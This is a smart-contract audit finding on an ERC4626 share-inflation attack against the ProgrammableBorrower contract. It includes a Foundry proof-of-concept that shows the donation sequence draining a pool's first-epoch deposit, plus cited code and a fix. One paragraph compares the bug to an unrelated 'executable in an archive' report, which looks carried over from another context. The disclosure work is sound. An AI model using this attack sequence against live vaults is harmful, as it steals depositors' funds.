### Title

ERC4626 share inflation can steal programmable-borrower epoch deposits - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary

`ProgrammableBorrower` deposits pool principal into an arbitrary ERC4626 vault without a minimum-share check or confirmation that the received shares represent the deposited assets. An attacker who uses that vault before the first `startEpoch` can inflate the vault’s share price with a donation, cause the borrower’s deposit to mint zero or dust shares, and redeem their own shares for the pool deposit.

### Finding Description

`ProgrammableBorrower.initialize` validates only that the configured vault’s `asset()` matches the CDO underlying; it does not require an established vault position, perform a seed deposit, or protect the first deposit against inflation. [1](#0-0) 

During `IdleCDOEpochVariant.startEpoch`, pool underlyings are transferred to the programmable borrower and `onStartEpoch` is invoked. [2](#0-1)  `onStartEpoch` then deposits every token held by the borrower into the configured vault. [3](#0-2) 

The vulnerable operation is `_depositToVault`: it accepts the returned share count but never checks that it is nonzero or economically equivalent to `_assetAmount`. [4](#0-3)  In a conventional ERC4626 implementation, an attacker can deposit `1 wei` first, donate enough underlying to make `convertToShares(poolDeposit)` round down to zero, and remain the only meaningful shareholder.

This is directly analogous to the external report’s “executable in an archive” behavior: an attacker-controlled artifact embedded in a trusted external component causes the privileged flow to execute a harmful action. Here, attacker-controlled ERC4626 share-price state causes `ProgrammableBorrower` to donate the pool’s principal to the vault.

### Impact Explanation

The attacker can steal substantially all underlying deposited into the programmable borrower on the first epoch. For example, if the pool sends 10,000 USDC and the attacker creates a vault state with `1 share / 20,000 USDC`, the borrower’s 10,000-USDC deposit mints zero shares. The attacker then redeems their one share for approximately 30,000 USDC, including the pool’s 10,000 USDC.

The broken invariant is fair share minting and deposit isolation: deposited principal remains represented by recoverable vault shares. `ProgrammableBorrower` treats the deposit as successful solely because `vault.deposit` returned, without checking the minted shares or resulting claim. [5](#0-4) 

### Likelihood Explanation

Likelihood is conditional rather than universal. The attack requires the programmable borrower to be initialized against a vault whose position can be made empty or nearly empty, or requires the attacker to hold a dominant share of the vault before the borrower’s deposit. A vault with substantial unrelated shares makes the donation attack expensive.

No privileged role is required. The attacker only needs to be an ordinary user of the configured ERC4626 vault: deposit a tiny amount, donate underlying, let `startEpoch` deposit pool principal, and redeem. The asset check and unlimited approval do not prevent the inflation because the vault address itself can be honest and correctly configured. [1](#0-0) 

### Recommendation

Before enabling a programmable borrower, require and verify a meaningful initial vault position or perform the first vault deposit atomically during initialization with a nonzero minimum-share requirement.

Inside `_depositToVault`, compare the vault share balance before and after the deposit and require it to increase by an amount consistent with an independently derived minimum share amount. Revert if `shares == 0` or below the configured tolerance. Alternatively, require the operator to supply a minimum acceptable share count for each deposit.

A defense at initialization alone is insufficient because `setVault` can later point to another vault; each new vault should be seeded or each deposit should remain protected by a minimum-share check.

### Proof of Concept

The following Foundry-style sequence reproduces the issue against a standard share-price-based ERC4626 vault on a mainnet fork using USDC as the underlying:

```solidity
function testVaultShareInflationStealsEpochDeposit() public {
    uint256 attackerSeed = 1;
    uint256 donation = 20_000e6;
    uint256 poolDeposit = 10_000e6;

    // The configured ERC4626 vault initially has no shares.
    deal(USDC, attacker, attackerSeed + donation);

    vm.startPrank(attacker);
    usdc.approve(address(vault), attackerSeed);
    vault.deposit(attackerSeed, attacker);       // attacker receives 1 share
    usdc.transfer(address(vault), donation);     // 1 share now claims 20,000 USDC
    vm.stopPrank();

    // Pool funds are deposited into the CDO.
    deal(USDC, lender, poolDeposit);
    vm.startPrank(lender);
    usdc.approve(address(cdoEpoch), poolDeposit);
    cdoEpoch.depositAA(poolDeposit);
    vm.stopPrank();

    // startEpoch sends the pool balance to ProgrammableBorrower, whose
    // onStartEpoch calls vault.deposit(poolDeposit, ProgrammableBorrower).
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // Because shares = poolDeposit * 1 / (donation + attackerSeed),
    // ProgrammableBorrower receives zero shares.
    assertEq(vault.balanceOf(address(programmableBorrower)), 0);
    assertEq(vault.totalSupply(), attackerSeed);

    uint256 attackerBalanceBefore = usdc.balanceOf(attacker);

    vm.prank(attacker);
    vault.redeem(attackerSeed, attacker, attacker);

    // Attacker receives seed + donation + poolDeposit.
    assertEq(
        usdc.balanceOf(attacker) - attackerBalanceBefore,
        attackerSeed + donation + poolDeposit
    );
}
```

The critical assertion is that `ProgrammableBorrower` ends with zero vault shares after depositing `poolDeposit`, while the attacker’s single share can redeem the combined vault balance. The precise dust threshold depends on the vault’s rounding and decimals-offset implementation, but the missing minimum-share check makes the deposit path unsafe whenever a configured vault permits a pre-deposit share-price inflation state.

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L212-223)
```text
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L374-384)
```text
  /// @notice Move a specific amount of idle underlying into the vault.
  /// @param _assetAmount Amount of underlying to deposit
  /// @param _principalAssets Portion of the deposited assets that should extend the epoch principal
  /// baseline instead of being recognized as current-epoch profit.
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/IdleCDOEpochVariant.sol (L279-298)
```text
    uint256 pendingInstant = _pendingInstant();
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
```
